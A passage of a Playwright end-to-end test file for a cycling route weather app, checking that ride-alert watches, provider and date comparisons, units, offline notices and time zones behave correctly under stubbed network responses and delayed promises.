  await expect(page.locator('#rideAlertsStatus')).toHaveText('');
});

const flipRideAlerts = (page, ...states) =>
  page.evaluate((all) => {
    const el = document.getElementById('rideAlerts');
    for (const on of all) {
      el.checked = on;
      el.dispatchEvent(new Event('change', { bubbles: true }));
    }
  }, states);

test('a disarm the runner answers late cannot leave the old route armed once another route is confirmed', async ({ page }) => {
  await installNativeBridge(page);
  const control = {};
  await stubWatchProviders(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await armedWatches(page)).length).toBe(1);

  // Off and on again while the runner is slow: the disarm is in flight, the new arm waits behind it.
  await page.evaluate(() => {
    window.__runnerHoldDisarm = new Promise((r) => { window.__answerDisarm = r; });
    window.__runnerHoldNext = new Promise((r) => { window.__answerSave = r; });
  });
  await flipRideAlerts(page, false, true);
  await page.waitForTimeout(300);
  await page.evaluate(() => window.__answerDisarm());
  // The save of the same route has reached the runner, which has not answered it yet.
  await expect.poll(() => page.evaluate(() => window.__runnerEvents.filter((e) => e.event === 'saveWatch' && e.details.watch).length)).toBe(2);

  control.forecastHeld = heldPromise().promise;
  await pickText(page, 'b.gpx', routeAt('Ruta B', 40.42));
  await expect(routeName(page)).toHaveText('Ruta B');
  await page.evaluate(() => window.__answerSave());
  await expect.poll(() => lastStored(page)).toBeNull();
});

test('the same route confirmed again while its watch waits for permission asks for no baseline and stores nothing', async ({ page }) => {
  await installNativeBridge(page);
  const control = {};
  await stubWatchProviders(page, control);
  await page.addInitScript(() => { window.__permissionHeld = new Promise((r) => { window.__grantPermission = r; }); });
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(() => page.evaluate(() => window.__notifAsked)).toBe(true);

  // Confirming the same route disarms nothing and supersedes no arm; only the snapshot changed.
  control.forecastHeld = heldPromise().promise;
  await forgetForecasts(page);
  await countLaunches(page);
  await page.evaluate(() => { document.getElementById('gpxFile').value = ''; });
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(() => page.evaluate(() => window.__launches.launch)).toBe(1);
  await page.evaluate(() => window.__grantPermission());
  await page.waitForTimeout(800);

  expect(control.baselineAsked).toBe(0);
  expect(await storedWatches(page)).toEqual([]);
});

test('a save the runner answers after the same route is confirmed again leaves the status line alone', async ({ page }) => {
  await installNativeBridge(page);
  const control = {};
  await stubWatchProviders(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.evaluate(() => { window.__runnerHoldNext = new Promise((r) => { window.__answerSave = r; }); });
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(() => page.evaluate(() => window.__runnerEvents.some((e) => e.event === 'saveWatch' && e.details.watch))).toBe(true);

  control.forecastHeld = heldPromise().promise;
  await forgetForecasts(page);
  await countLaunches(page);
  await page.evaluate(() => { document.getElementById('gpxFile').value = ''; });
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(() => page.evaluate(() => window.__launches.launch)).toBe(1);
  await page.evaluate(() => window.__answerSave());
  await expect.poll(async () => (await armedWatches(page)).length).toBe(1);
  await page.waitForTimeout(300);
  await expect(page.locator('#rideAlertsStatus')).toHaveText('');
});

test('the route restored at start-up keeps its stored watch even when it is confirmed before that watch is read', async ({ page }) => {
  await installNativeBridge(page);
  await stubWatchProviders(page, { watch: { rain: 0, wind: 8, gust: 12 } });
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await armedWatches(page)).length).toBe(1);
  await expect.poll(async () => (await storedRoutes(page)).length).toBe(1);
  await markStoredWatch(page);

  await page.addInitScript(() => { window.__runnerHoldLoad = new Promise((r) => { window.__answerLoad = r; }); });
  await page.reload();
  await mapReady(page);
  await expect(routeName(page)).toContainText('Masnou');
  await page.waitForTimeout(500);
  expect(await storedWatches(page)).toEqual([]);

  await page.evaluate(() => window.__answerLoad());
  await expect.poll(async () => (await storedWatches(page)).length).toBe(1);
  const watch = await lastStored(page);
  expect(watch).not.toBeNull();
  expect(watch.notified).toEqual(['AEMET_Viento_1_2']);
});

test('a stored watch the runner cannot read still lets the route arm afresh, and no read leaves its failure unhandled', async ({ page }) => {
  await installNativeBridge(page);
  await page.addInitScript(() => {
    window.__runnerLoadFails = true;
    window.__unhandled = [];
    window.addEventListener('unhandledrejection', (e) => window.__unhandled.push(String((e.reason && e.reason.message) || e.reason)));
  });
  await stubWatchProviders(page, {});
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await armedWatches(page)).length).toBe(1);
  expect((await lastStored(page)).notified).toEqual([]);
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => window.__unhandled)).toEqual([]);
});

test('a disarm the runner refuses still leaves the old route to be disarmed when the next route is confirmed', async ({ page }) => {
  await installNativeBridge(page);
  const control = {};
  await stubWatchProviders(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await armedWatches(page)).length).toBe(1);

  // Another route is confirmed and the runner refuses to clear the watch: it still holds the first route.
  control.forecastHeld = heldPromise().promise;
  await page.evaluate(() => { window.__runnerDisarmFails = true; });
  await pickText(page, 'b.gpx', routeAt('Ruta B', 40.42));
  await expect(routeName(page)).toHaveText('Ruta B');
  await expect.poll(() => page.evaluate(() => window.__runnerDisarmFails)).toBe(false);
  await page.waitForTimeout(300);
  expect(await lastStored(page)).not.toBeNull();

  await pickText(page, 'c.gpx', routeAt('Ruta C', 40.44));
  await expect(routeName(page)).toHaveText('Ruta C');
  await expect.poll(() => lastStored(page)).toBeNull();
});

/* ---------- comparing providers ---------- */

/** From now on, counts the comparisons launched (cwLaunchComparison giving a run) and the
 *  latitudes of every baseline a comparison writes into weatherData, which it does as it paints. */
const watchComparisons = (page) =>
  page.evaluate(() => {
    window.__comparisons = [];
    const launch = window.cwLaunchComparison;
    window.cwLaunchComparison = function (...args) {
      const run = launch.apply(this, args);
      if (run) window.__comparisons.push(run.comparisonId);
      return run;
    };
    window.__baselines = [];
    const set = window.cw.setWeatherData;
    window.cw.setWeatherData = function (arr) {
      window.__baselines.push((arr || []).map((s) => s.lat));
      return set.call(this, arr);
    };
  });
const comparisonsLaunched = (page) => page.evaluate(() => (window.__comparisons || []).length);
const selectProvider = (page, value) =>
  page.evaluate((v) => {
    const sel = document.getElementById('apiSource');
    sel.value = v;
    sel.dispatchEvent(new Event('change', { bubbles: true }));
  }, value);
const compareShown = (page) => page.evaluate(() => document.getElementById('weatherTable').classList.contains('compare-mode'));
const comparedLat = (page) => page.evaluate(() => window.cw.compareProviderData?.openmeteo?.[0]?.lat ?? null);
/** Forgets every cached forecast, so the next comparison has to ask the provider. */
const forgetForecasts = (page) =>
  page.evaluate(() => { for (const k of Object.keys(localStorage)) if (k.startsWith('cw_weather_')) localStorage.removeItem(k); });

async function routeInCompareMode(page, control) {
  await stubWatchProviders(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await selectProvider(page, 'compare');
  await expect.poll(() => compareShown(page)).toBe(true);
}

test('with compare selected, a new route publishes its forecast and then launches one comparison, of that route', async ({ page }) => {
  await routeInCompareMode(page, {});
  await watchComparisons(page);
  await page.evaluate(() => {
    window.__published = [];
    document.addEventListener('cw:forecast', (e) => window.__published.push(e.detail.snapshot.route.name));
  });

  await pickText(page, 'b.gpx', routeAt('Ruta B', 40.42));
  await expect(routeName(page)).toHaveText('Ruta B');
  await expect.poll(() => comparedLat(page)).toBeCloseTo(40.42, 2);
  await page.waitForTimeout(800);
  expect(await page.evaluate(() => window.__published)).toEqual(['b.gpx']);
  expect(await comparisonsLaunched(page)).toBe(1);
  expect(await compareShown(page)).toBe(true);
});

test('a comparison still fetching when the speed changes never paints; the one after the new forecast does', async ({ page }) => {
  const control = {};
  await routeInCompareMode(page, control);
  const slow = await page.evaluate(() => window.cw.compareProviderData.openmeteo.length);
  await watchComparisons(page);
  await forgetForecasts(page);
  const held = heldPromise();
  control.forecastHeld = held.promise;
  await page.evaluate(() => { window.cw.runCompareMode(); });
  await expect.poll(() => comparisonsLaunched(page)).toBe(1);

  await setSpeed(page, 60);
  await page.waitForTimeout(200);
  control.forecastHeld = null;
  held.release();
  await expect.poll(() => comparisonsLaunched(page)).toBe(2);
  await expect.poll(() => page.evaluate(() => window.__baselines.length)).toBe(1);
  await page.waitForTimeout(1000);
  const baselines = await page.evaluate(() => window.__baselines);
  expect(baselines).toHaveLength(1);
  expect(baselines[0].length).toBeLessThan(slow);
  expect(await page.evaluate(() => window.weatherData.length)).toBe(baselines[0].length);
});

test('a comparison still fetching when another route is confirmed never paints', async ({ page }) => {
  const control = {};
  await routeInCompareMode(page, control);
  await watchComparisons(page);
  await forgetForecasts(page);
  const held = heldPromise();
  control.forecastHeld = held.promise;
  await page.evaluate(() => { window.cw.runCompareMode(); });
  await expect.poll(() => comparisonsLaunched(page)).toBe(1);

  await pickText(page, 'b.gpx', routeAt('Ruta B', 40.42));
  await expect(routeName(page)).toHaveText('Ruta B');
  control.forecastHeld = null;
  held.release();
  await expect.poll(() => comparedLat(page)).toBeCloseTo(40.42, 2);
  await page.waitForTimeout(1000);
  const baselines = await page.evaluate(() => window.__baselines);
  expect(baselines).toHaveLength(1);
  expect(baselines[0][0]).toBeCloseTo(40.42, 2);
});

test('choosing compare while a new forecast is computed leaves its indicator on and compares once it publishes', async ({ page }) => {
  const control = {};
  await stubWatchProviders(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await watchComparisons(page);

  const held = heldPromise();
  control.forecastHeld = held.promise;
  await setSpeed(page, 60);
  await expect.poll(() => overlayVisibility(page)).toBe('visible');
  await selectProvider(page, 'compare');
  await page.waitForTimeout(300);
  expect(await comparisonsLaunched(page), 'compared the forecast being replaced').toBe(0);
  expect(await overlayVisibility(page)).toBe('visible');

  control.forecastHeld = null;
  held.release();
  await expect.poll(() => compareShown(page)).toBe(true);
  expect(await comparisonsLaunched(page)).toBe(1);
  await expect.poll(() => overlayVisibility(page)).toBe('hidden');
});

test('a comparison that paints with nothing to say leaves up the notice of a route that failed to open while it fetched', async ({ page }) => {
  const control = {};
  await routeInCompareMode(page, control);
  await watchComparisons(page);
  await forgetForecasts(page);
  const held = heldPromise();
  control.forecastHeld = held.promise;
  await page.evaluate(() => { window.cw.runCompareMode(); });
  await expect.poll(() => comparisonsLaunched(page)).toBe(1);

  await pickText(page, 'broken.gpx', 'this is not a route');
  await expect(page.locator('#horizonNotice')).toHaveText(loadFailedNotice);
  control.forecastHeld = null;
  held.release();
  await expect.poll(() => page.evaluate(() => window.__baselines.length)).toBe(1);
  await page.waitForTimeout(300);
  await expect(page.locator('#horizonNotice')).toHaveText(loadFailedNotice);
});

test('a comparison with nothing to say clears the notice of the comparison before it, even after a route failed to open for the same forecast', async ({ page }) => {
  await routeInCompareMode(page, {});
  await watchComparisons(page);
  const notice = page.locator('#horizonNotice');
  await pickText(page, 'broken.gpx', 'this is not a route');
  await expect(notice).toHaveText(loadFailedNotice);

  // Without connection the next comparison fails, and says so over the failure.
  await forgetForecasts(page);
  const openMeteo = (url) => url.hostname === 'api.open-meteo.com';
  const abort = (route) => route.abort();
  await page.route(openMeteo, abort);
  await page.evaluate(() => Object.defineProperty(navigator, 'onLine', { configurable: true, get: () => false }));
  await page.evaluate(() => { window.cw.runCompareMode(); });
  await expect(notice).toContainText('No connection');

  // Back online, the comparison after it has nothing to say.
  await page.unroute(openMeteo, abort);
  await page.evaluate(() => Object.defineProperty(navigator, 'onLine', { configurable: true, get: () => true }));
  const painted = await page.evaluate(() => window.__baselines.length);
  await page.evaluate(() => { window.cw.runCompareMode(); });
  await expect.poll(() => page.evaluate(() => window.__baselines.length)).toBeGreaterThan(painted);
  await page.waitForTimeout(300);
  await expect(notice).toBeHidden();
});

test('a comparison still fetching when the selector leaves compare never paints, even while a route request holds back the forecast', async ({ page }) => {
  const control = {};
  await routeInCompareMode(page, control);
  await watchComparisons(page);
  await forgetForecasts(page);
  const held = heldPromise();
  control.forecastHeld = held.promise;
  await page.evaluate(() => { window.cw.runCompareMode(); });
  await expect.poll(() => comparisonsLaunched(page)).toBe(1);

  // A route request still being read leaves the provider change pending: nothing is computed yet.
  await requestHeld(page, 'next');
  await selectProvider(page, 'openmeteo');
  await expect.poll(() => compareShown(page)).toBe(false);
  control.forecastHeld = null;
  held.release();
  await page.waitForTimeout(1500);
  expect(await page.evaluate(() => window.__baselines)).toEqual([]);
  expect(await compareShown(page)).toBe(false);
});

test('a replaced comparison that finishes lets go of its own claim only: the indicator stays on while the next one fetches', async ({ page }) => {
  // Open-Meteo answers at once; AROME, which only a comparison asks here, waits while `held` is set.
  const control = { held: null, arome: 0 };
  await page.route((url) => url.hostname === 'api.open-meteo.com', async (route) => {
    const arome = new URL(route.request().url()).searchParams.get('models') === 'arome_france_hd';
    if (arome) control.arome++;
    const held = arome ? control.held : null;
    if (held) await held;
    return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(forecastAt(20)) });
  });
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await selectProvider(page, 'compare');
  await expect.poll(() => compareShown(page)).toBe(true);
  await expect.poll(() => overlayVisibility(page)).toBe('hidden');
  await watchComparisons(page);
  await forgetForecasts(page);

  const first = heldPromise();
  Object.assign(control, { held: first.promise, arome: 0 });
  await page.evaluate(() => { window.cw.runCompareMode(); });
  await expect.poll(() => control.arome).toBe(1);
  const second = heldPromise();
  control.held = second.promise;
  // The new forecast publishes at once and launches the comparison that replaces the first.
  await setSpeed(page, 60);
  await expect.poll(() => comparisonsLaunched(page)).toBe(2);
  await expect.poll(() => control.arome).toBe(2);

  first.release();
  await page.waitForTimeout(800);
  expect(await overlayVisibility(page), 'the replaced comparison switched off the indicator of the next').toBe('visible');
  control.held = null;
  second.release();
  await expect.poll(() => page.evaluate(() => window.__baselines.length)).toBe(1);
  await expect.poll(() => overlayVisibility(page)).toBe('hidden');
});

test('a comparison whose provider never answers lets go of the indicator once the next comparison is launched', async ({ page }) => {
  // Open-Meteo answers at once; AROME, which only a comparison asks here, waits while `held` is set.
  const control = { held: null, arome: 0 };
  await page.route((url) => url.hostname === 'api.open-meteo.com', async (route) => {
    const arome = new URL(route.request().url()).searchParams.get('models') === 'arome_france_hd';
    if (arome) control.arome++;
    const held = arome ? control.held : null;
    if (held) await held;
    return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(forecastAt(20)) });
  });
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await selectProvider(page, 'compare');
  await expect.poll(() => compareShown(page)).toBe(true);
  await expect.poll(() => overlayVisibility(page)).toBe('hidden');
  await watchComparisons(page);
  await forgetForecasts(page);

  // The first comparison's provider never answers while the checks below run.
  const never = heldPromise();
  Object.assign(control, { held: never.promise, arome: 0 });
  await page.evaluate(() => { window.cw.runCompareMode(); });
  await expect.poll(() => control.arome).toBe(1);
  await expect.poll(() => overlayVisibility(page)).toBe('visible');

  control.held = null;
  await page.evaluate(() => { window.cw.runCompareMode(); });
  await expect.poll(() => page.evaluate(() => window.__baselines.length)).toBe(1);
  await expect.poll(() => overlayVisibility(page)).toBe('hidden');
  never.release();
});

test('a cold start with compare saved compares the restored route once', async ({ page }) => {
  await installNativeBridge(page);
  await stubWatchProviders(page, {});
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await expect.poll(async () => (await storedRoutes(page)).length).toBe(1);
  await selectProvider(page, 'compare');
  await expect.poll(() => compareShown(page)).toBe(true);

  // Counts every comparison launched from the very start of the next page.
  await page.addInitScript(() => {
    window.__comparisons = [];
    let launch;
    Object.defineProperty(window, 'cwLaunchComparison', {
      configurable: true,
      get: () => launch,
      set: (fn) => {
        launch = function (...args) {
          const run = fn.apply(this, args);
          if (run) window.__comparisons.push(run.comparisonId);
          return run;
        };
      },
    });
  });
  await page.reload();
  await mapReady(page);
  await expect(routeName(page)).toContainText('Masnou');
  await expect.poll(() => compareShown(page)).toBe(true);
  await page.waitForTimeout(1500);
  expect(await comparisonsLaunched(page)).toBe(1);
});

/* ---------- comparing dates ---------- */

const setDateB = (page, days) =>
  page.evaluate((d) => {
    const a = new Date(document.getElementById('datetimeRoute').value);
    const b = new Date(a.getTime() + d * 86400000);
    const pad = (n) => String(n).padStart(2, '0');
    document.getElementById('datetimeRoute2').value =
      `${b.getFullYear()}-${pad(b.getMonth() + 1)}-${pad(b.getDate())}T${pad(b.getHours())}:${pad(b.getMinutes())}`;
    return `${pad(b.getDate())}/${pad(b.getMonth() + 1)}`;
  }, days);
/** Opens compare-by-dates the way the toggle does (the run button decides when), date B a day after A. */
async function openCompareDates(page) {
  await page.evaluate(() => document.getElementById('toggleCompareDates').click());
  await setDateB(page, 1);
}
const runCompareDates = (page) => page.evaluate(() => document.getElementById('compareDatesNow').click());
const datesShown = (page) => page.evaluate(() => document.getElementById('weatherTable').classList.contains('compare-dates-mode'));
/** Records every date comparison that paints: it stores its rows right after drawing them. */
const watchDatePaints = (page) =>
  page.evaluate(() => {
    window.__datePaints = [];
    let rows;
    Object.defineProperty(window.cw, 'weatherDataA', {
      configurable: true,
      get: () => rows,
      set: (v) => {
        rows = v;
        const labels = document.querySelectorAll('#weatherTable .date-label');
        window.__datePaints.push({ lat: v && v[0] ? v[0].lat : null, dateB: labels[1] ? labels[1].textContent.trim() : null });
      },
    });
  });

test('a date comparison still fetching when another route is confirmed never paints', async ({ page }) => {
  const control = {};
  await stubWatchProviders(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await openCompareDates(page);
  await watchDatePaints(page);
  await forgetForecasts(page);
  const held = heldPromise();
  control.forecastHeld = held.promise;
  await runCompareDates(page);
  await page.waitForTimeout(300);

  await pickText(page, 'b.gpx', routeAt('Ruta B', 40.42));
  await expect(routeName(page)).toHaveText('Ruta B');
  control.forecastHeld = null;
  held.release();
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await page.waitForTimeout(1500);
  expect(await page.evaluate(() => window.__datePaints)).toEqual([]);
  expect(await datesShown(page)).toBe(false);
});

test('of two date comparisons launched one after the other, only the last paints', async ({ page }) => {
  const control = {};
  await stubWatchProviders(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await openCompareDates(page);
  await watchDatePaints(page);
  await forgetForecasts(page);
  const held = heldPromise();
  control.forecastHeld = held.promise;
  await runCompareDates(page);
  await page.waitForTimeout(300);
  const second = await setDateB(page, 2);
  await runCompareDates(page);
  await page.waitForTimeout(300);

  control.forecastHeld = null;
  held.release();
  await expect.poll(() => datesShown(page)).toBe(true);
  await page.waitForTimeout(1500);
  expect(await page.evaluate(() => window.__datePaints)).toEqual([{ lat: expect.any(Number), dateB: second }]);
});

test('a date comparison still fetching when compare-by-dates is closed never paints, even while a route request holds back the forecast', async ({ page }) => {
  const control = {};
  await stubWatchProviders(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await openCompareDates(page);
  await watchComparisons(page);
  await watchDatePaints(page);
  await forgetForecasts(page);
  const held = heldPromise();
  control.forecastHeld = held.promise;
  await runCompareDates(page);
  await expect.poll(() => comparisonsLaunched(page)).toBe(1);

  // A route request still being read leaves the recomputation pending: closing the row computes nothing yet.
  await requestHeld(page, 'next');
  await page.evaluate(() => document.getElementById('toggleCompareDates').click());
  control.forecastHeld = null;
  held.release();
  await page.waitForTimeout(1500);
  expect(await page.evaluate(() => window.__datePaints)).toEqual([]);
  expect(await datesShown(page)).toBe(false);
});

test('the run button compares dates for the forecast on screen, and nothing while its computation still runs', async ({ page }) => {
  const control = {};
  await stubWatchProviders(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await openCompareDates(page);
  await watchComparisons(page);

  // The forecast on screen is being replaced: there is nothing to compare until it publishes.
  const held = heldPromise();
  control.forecastHeld = held.promise;
  await setSpeed(page, 60);
  await expect.poll(() => overlayVisibility(page)).toBe('visible');
  await runCompareDates(page);
  await page.waitForTimeout(500);
  expect(await comparisonsLaunched(page)).toBe(0);

  control.forecastHeld = null;
  held.release();
  await expect.poll(() => overlayVisibility(page)).toBe('hidden');
  expect(await datesShown(page)).toBe(false);
  await setDateB(page, 1);
  await runCompareDates(page);
  await expect.poll(() => datesShown(page)).toBe(true);
  expect(await comparisonsLaunched(page)).toBe(1);
});

test('closing compare-by-dates with compare chosen goes back to comparing providers', async ({ page }) => {
  await routeInCompareMode(page, {});
  await openCompareDates(page);
  await runCompareDates(page);
  await expect.poll(() => datesShown(page)).toBe(true);
  await watchComparisons(page);

  await page.evaluate(() => document.getElementById('toggleCompareDates').click());
  await expect.poll(() => compareShown(page)).toBe(true);
  expect(await datesShown(page)).toBe(false);
  await page.waitForTimeout(800);
  expect(await comparisonsLaunched(page)).toBe(1);
});

// The dates table stayed marked as such under the providers table, so a provider row picked was
// taken for a date row: another row was selected and the map showed the earlier date comparison.
test('choosing compare over a date comparison on screen compares providers, and a provider row picked shows that provider', async ({ page }) => {
  await routeInCompareMode(page, {});
  await openCompareDates(page);
  await runCompareDates(page);
  await expect.poll(() => datesShown(page)).toBe(true);
  await watchComparisons(page);

  await selectProvider(page, 'compare');
  await expect.poll(() => page.evaluate(() => window.__baselines.length)).toBe(1);
  await page.evaluate(() => {
    window.__markers = [];
    const create = window.cw.createMarkersForData;
    window.cw.createMarkersForData = function (data, label) {
      window.__markers.push({ label, providerData: data === window.cw.compareProviderData[label] });
      return create.apply(this, arguments);
    };
  });
  await page.locator('#weatherTable tr[data-prov="aromehd"] th').click();
  await expect.poll(() => page.evaluate(() => window.__markers)).toEqual([{ label: 'aromehd', providerData: true }]);
  expect(await page.locator('#weatherTable tr.selected-row').getAttribute('data-prov')).toBe('aromehd');
  expect(await datesShown(page)).toBe(false);
});

/* ---------- the units a comparison reads in ---------- */

/** Forecast in OpenWeather, ºC and m/s on screen, then new units left waiting behind a route
 *  request: the forecast on screen is still the one computed in ºC and m/s. */
async function openWeatherUnitsPending(page) {
  await goOffline(page);
  await stubOpenWeather(page, {});
  await page.goto('/index.html');
  await mapReady(page);
  await selectOpenWeather(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(() => shownTemperature(page)).toEqual({ cells: ['21º'], unit: 'ºC', summary: '21ºC' });
  await requestHeld(page, 'B');
  await setTempUnits(page, 'F');
  await setWindUnits(page, 'kmh');
}

// A comparison asks in the units of the forecast on screen, so it has to read and label the
// answer in them too. Read in the units selected now, OpenWeather's 3 m/s came out as 1.3.
test('a comparison launched while new units wait behind a route request reads and labels OpenWeather in the units it asked in', async ({ page }) => {
  await openWeatherUnitsPending(page);
  await selectProvider(page, 'compare');
  const row = page.locator('#weatherTable tr[data-prov="openweather"]');
  await expect(row.locator('td[data-col] .combined-top').first()).toHaveText('21º');
  expect(await row.locator('td[data-col] .combined-bottom').first().textContent()).toBe('3.0');
  await expect(row.locator('.summary-cell')).toContainText('21ºC');
  await expect(row.locator('.summary-cell')).toContainText('3m/s');
});

test('a date comparison run while new units wait behind a route request reads and labels OpenWeather in the units it asked in', async ({ page }) => {
  await openWeatherUnitsPending(page);
  await openCompareDates(page);
  await runCompareDates(page);
  await expect.poll(() => datesShown(page)).toBe(true);
  const summaryA = page.locator('#weatherTable tr[data-row="1"]');
  await expect(summaryA.locator('td[data-col] .combined-top').first()).toHaveText('21º');
  expect(await summaryA.locator('td[data-col] .combined-bottom').first().textContent()).toBe('3.0');
  await expect(summaryA.locator('th')).toContainText('21ºC');
  await expect(summaryA.locator('th')).toContainText('3m/s');
});

/* ---------- what a comparison says, and which hour it reads ---------- */

test('a comparison whose requests all fail without connection says there is no connection', async ({ page }) => {
  await recordNotices(page);
  await stubWatchProviders(page, {});
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await forgetForecasts(page);

  // From here the phone has no connection and every request fails.
  await page.route((url) => url.hostname === 'api.open-meteo.com', (route) => route.abort());
  await page.evaluate(() => Object.defineProperty(navigator, 'onLine', { configurable: true, get: () => false }));
  await selectProvider(page, 'compare');
  await expect.poll(() => compareShown(page)).toBe(true);
  await expect.poll(() => page.evaluate(() => window.__notices.join(' | '))).toContain('No connection, and no saved forecast');
});

test('a comparison whose answers cannot be read says the provider is not responding', async ({ page }) => {
  await recordNotices(page);
  const control = { unreadable: false };
  await page.route((url) => url.hostname === 'api.open-meteo.com', (route) =>
    route.fulfill({ status: 200, contentType: 'application/json', body: control.unreadable ? '{"hourly": ' : JSON.stringify(forecastAt(20)) }));
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await forgetForecasts(page);

  control.unreadable = true;
  await selectProvider(page, 'compare');
  await expect.poll(() => compareShown(page)).toBe(true);
  await expect.poll(() => page.evaluate(() => window.__notices.join(' | '))).toContain('not responding');
});

test('a replaced comparison whose requests failed leaves no notice over the comparison that replaced it', async ({ page }) => {
  await recordNotices(page);
  // While `failing`, every request fails, and the one numbered `holdAt` only once `gate` opens.
  const control = { failing: false, n: 0, holdAt: 0, gate: null };
  await page.route((url) => url.hostname === 'api.open-meteo.com', async (route) => {
    if (!control.failing) {
      return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(forecastAt(20)) });
    }
    control.n++;
    if (control.n === control.holdAt) await control.gate;
    return route.abort();
  });
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await forgetForecasts(page);
  await watchComparisons(page);

  // The first comparison asks Open-Meteo and AROME for every step; its last request waits.
  const steps = await page.evaluate(() => window.cw.currentSnapshot().steps.length);
  const gate = heldPromise();
  Object.assign(control, { failing: true, n: 0, holdAt: steps * 2, gate: gate.promise });
  await selectProvider(page, 'compare');
  await expect.poll(() => control.n).toBe(steps * 2);

  control.failing = false;
  await page.evaluate(() => { window.cw.runCompareMode(); });
  await expect.poll(() => page.evaluate(() => window.__baselines.length)).toBe(1);
  gate.release();
  await page.waitForTimeout(800);
  expect(await page.evaluate(() => window.__baselines.length)).toBe(1);
  expect((await page.evaluate(() => window.__notices)).filter((n) => /not responding|No connection/.test(n))).toEqual([]);
});

/** Open-Meteo as it answers for a place `offsetSeconds` from UTC with timezone=auto: wall-clock
 *  hours with no zone, and a different temperature every hour. */
function forecastInZone(offsetSeconds) {
  const pad = (n) => String(n).padStart(2, '0');
  const first = Math.floor(Date.now() / 3600000) * 3600000 - 24 * 3600000;
  const time = [];
  const temperature = [];
  for (let i = 0; i < 96; i++) {
    const wall = new Date(first + i * 3600000 + offsetSeconds * 1000);
    time.push(`${wall.getUTCFullYear()}-${pad(wall.getUTCMonth() + 1)}-${pad(wall.getUTCDate())}T${pad(wall.getUTCHours())}:00`);
    temperature.push(i % 40);
  }
  const fill = (v) => time.map(() => v);
  return {
    utc_offset_seconds: offsetSeconds,
    hourly: {
      time, temperature_2m: temperature, precipitation: fill(0), precipitation_probability: fill(5),
      relative_humidity_2m: fill(60), wind_speed_10m: fill(12), wind_gusts_10m: fill(20), winddirection_10m: fill(180),
      weathercode: fill(1), uv_index: fill(3), is_day: fill(1), cloud_cover: fill(20),
    },
  };
}

test.describe('with the phone in New York and the route in Spain', () => {
  test.use({ timezoneId: 'America/New_York' });

  test('the comparison reads the hour the rider is there in the zone of the route, where the table reads it too', async ({ page }) => {
    await page.route((url) => url.hostname === 'api.open-meteo.com', (route) =>
      route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(forecastInZone(2 * 3600)) }));
    await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());
    await page.goto('/index.html');
    await mapReady(page);
    await page.locator('#gpxFile').setInputFiles(FIXTURE);
    await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
    const table = await page.evaluate(() => window.weatherData.map((s) => s.temp));

    await selectProvider(page, 'compare');
    await expect.poll(() => compareShown(page)).toBe(true);
